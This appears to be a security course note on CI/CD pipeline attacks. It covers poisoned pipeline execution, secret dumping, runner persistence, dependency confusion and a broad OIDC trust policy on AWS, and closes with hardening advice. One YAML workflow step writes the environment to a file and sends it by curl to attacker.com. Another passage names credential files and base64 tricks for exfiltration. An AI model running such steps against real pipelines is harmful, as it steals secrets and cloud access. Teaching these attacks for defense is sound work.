---
tags: [cloud-security, ci-cd, devsecops, supply-chain, pipeline]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.33 CI CD Pipeline Attacks"
---

# CI/CD Pipeline Attacks & Supply Chain Compromise

## 1. Introduction to CI/CD Security Architecture
Continuous Integration and Continuous Deployment (CI/CD) pipelines represent the automated engine of modern software delivery. They automatically compile code, run tests, build container images, and deploy applications from source control repositories directly to production cloud environments. 
Prominent platforms dominating this space include GitHub Actions, GitLab CI/CD, Jenkins, CircleCI, and AWS CodePipeline.

Because CI/CD pipelines fundamentally require deep, programmatic access to source code, container registries, and production cloud environments, they represent one of the most highly privileged components in any organization's infrastructure. Compromising the CI/CD pipeline is equivalent to compromising the entire software supply chain; it allows an attacker to inject backdoors into software before it is even shipped.

## 2. CI/CD Architecture & Threat Model

### ASCII Diagram: The CI/CD Attack Surface

```text
+----------------+      (1) Malicious Commit /    +-------------------+
| Attacker /     |      Pull Request Injection    | Source Repository |
| Compromised Dev| -----------------------------> | (GitHub, GitLab)  |
+----------------+                                +-------------------+
                                                          |
                                                          | (2) Webhook Trigger starts build
                                                          v
+----------------+      (4) Extract Secrets       +-------------------+
| Build Artifact/| <----------------------------- | CI/CD Runner      |
| Malicious Img  |      (Tokens, AWS Keys)        | (Executing Build) |
+----------------+                                +-------------------+
        |                                                 |
        | (5) Deploy Backdoor to Prod                     | (3) Assume Cloud Role via OIDC
        v                                                 v
+----------------+                                +-------------------+
| Production Env |                                | Cloud Environment |
| (K8s, EC2)     |                                | (AWS IAM, GCP SA) |
+----------------+                                +-------------------+
```

## 3. Primary Attack Vectors in Pipelines

### A. Poisoned Pipeline Execution (PPE)
PPE occurs when an attacker with limited repository access (e.g., the ability to submit a Pull Request or create a feature branch) modifies the CI/CD configuration files themselves (such as `.github/workflows/main.yml`, `.gitlab-ci.yml`, or a `Jenkinsfile`).
If the CI system is misconfigured to automatically execute these pipeline files on new branches or PRs without strict approval checks from maintainers, the attacker can execute arbitrary code on the highly privileged CI runner.

**Exploit Scenario:**
An attacker forks a public repository and modifies the build script to exfiltrate data:
```yaml
steps:
  - name: Malicious Exfiltration
    run: |
      # Dump all environment variables (often containing injected secrets)
      env > secrets.txt
      # Exfiltrate to attacker C2
      curl -X POST -d @secrets.txt https://attacker.com/steal
```
When they submit the Pull Request, the CI system runs the pipeline, effectively handing over all pipeline secrets (cloud keys, registry tokens) directly to the attacker.

### B. Dumping Pipeline Secrets
CI systems inject sensitive secrets (API keys, deployment credentials) directly into the runner environment so the build scripts can authenticate to external services.
Attackers who achieve arbitrary code execution on the runner (via PPE, exploiting vulnerable dependencies, or compromising build tools) can easily dump these secrets.
Common exfiltration techniques include:
- Executing `env`, `set`, or `export` commands.
- Reading credential files created dynamically by the pipeline (e.g., `~/.docker/config.json`, `~/.kube/config`).
- Base64 encoding secrets before exfiltration to easily bypass basic secret masking tools built into the GitHub/GitLab UI logs.

### C. Self-Hosted Runner Compromise & Persistence
Many enterprise organizations utilize self-hosted runners (running on their own internal EC2 instances or Kubernetes clusters) rather than cloud-hosted runners in order to access internal corporate networks or save on billing costs.
If an attacker executes code on a self-hosted runner, they immediately gain a persistent foothold *inside* the corporate network. 
Furthermore, self-hosted runners often retain state between jobs. An attacker can leave a persistent backdoor (like a reverse shell, a rogue SSH key, or a malicious cron job) that survives long after their initial malicious pipeline job finishes, allowing them to intercept future, legitimate builds.

### D. Dependency Confusion & Malicious Dependencies
During the build step, pipelines invariably download dependencies (via npm, pip, maven, etc.). 
- **Dependency Confusion:** An attacker registers a package on a public registry (like npmjs.com) with the exact name of a company's internal, private package, but with an artificially high version number. The CI pipeline, if misconfigured to check public registries before internal ones, downloads the attacker's malicious package and executes its pre-install scripts during the build process.
- **Compromised Upstream:** A legitimate, widely-used dependency is compromised upstream. When the CI pipeline builds the app, it pulls the malicious update, poisoning the resulting artifact and affecting all end users.

### E. Exploiting OIDC / IAM Trust Relationships
Modern CI/CD pipelines utilize OpenID Connect (OIDC) to authenticate to cloud providers, completely eliminating the need to store long-lived access keys as static secrets. The cloud provider mathematically trusts tokens issued by the CI provider (e.g., GitHub Actions).
**Misconfiguration:** If the cloud IAM Trust Policy is too broad (e.g., trusting *any* repository in the GitHub organization rather than a specific repository and branch), an attacker can create a personal, empty repository within the org, trigger a pipeline, and assume the highly privileged deployment role.

## 4. Exploit Walkthrough: OIDC Misconfiguration on AWS

**Vulnerable IAM Trust Policy:**
```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:AcmeCorp/*"  // VULNERABLE: Allows ANY repo in the AcmeCorp org
    }
  }
}
```

**Attack Execution Steps:**
1. The attacker, possessing basic developer access to the GitHub organization, creates a new, empty repository `AcmeCorp/attacker-test`.
2. They create a malicious GitHub Action workflow in this repository.
3. The workflow uses the `aws-actions/configure-aws-credentials` action, pointing to the vulnerable Role ARN.
4. Because the IAM `Condition` only loosely checks for `repo:AcmeCorp/*`, AWS readily accepts the OIDC token.
5. The attacker's workflow now possesses full deployment privileges to the production AWS account, allowing them to create backdoor IAM users, alter infrastructure, or exfiltrate databases.

## 5. Defense, Hardening, and Best Practices

- **Strict Branch Protection & Code Owners:** Enforce rigorous branch protection rules. Require mandatory reviews from designated code owners before any PR can be merged or before its pipeline executes in a privileged context.
- **Mandatory Pipeline Approvals:** For production deployment pipelines, mandate manual approval steps by authorized personnel.
- **Strict OIDC Conditions:** When using OIDC with cloud providers, narrow the trust conditions explicitly.
  *Secure Condition Example:* `"token.actions.githubusercontent.com:sub": "repo:AcmeCorp/production-app:ref:refs/heads/main"`
- **Ephemeral Environments Only:** Always prioritize ephemeral, cloud-hosted runners where possible. If self-hosted runners are strictly required, ensure they are destroyed and recreated from a pristine image after *every single job* to prevent cross-job contamination and persistence.
- **Secret Scanning & Management:** Deploy tools like TruffleHog or GitGuardian to proactively block commits containing secrets. Use robust secret managers (HashiCorp Vault, AWS Secrets Manager) and inject secrets directly into processes via memory, rather than writing them to disk.
- **Adopt the SLSA Framework:** Implement the Supply chain Levels for Software Artifacts (SLSA) framework to cryptographically ensure the provenance and integrity of builds.

## 6. Chaining Opportunities
- Achieving Poisoned Pipeline Execution (PPE) directly yields credentials that enable [[29 - Container Registry Attacks]] (pushing malicious images) or [[30 - Terraform CloudFormation Misconfigurations]] (altering fundamental infrastructure).
- A pipeline compromise directly facilitates a massive supply chain attack, impacting end users or downstream microservices running in [[31 - Kubernetes on Cloud — EKS, GKE, AKS]].

## 7. Related Notes
- [[29 - Container Registry Attacks]]
- [[30 - Terraform CloudFormation Misconfigurations]]
- [[34 - Cloud Backdoor via IAM Role]]
- [[31 - Kubernetes on Cloud — EKS, GKE, AKS]]
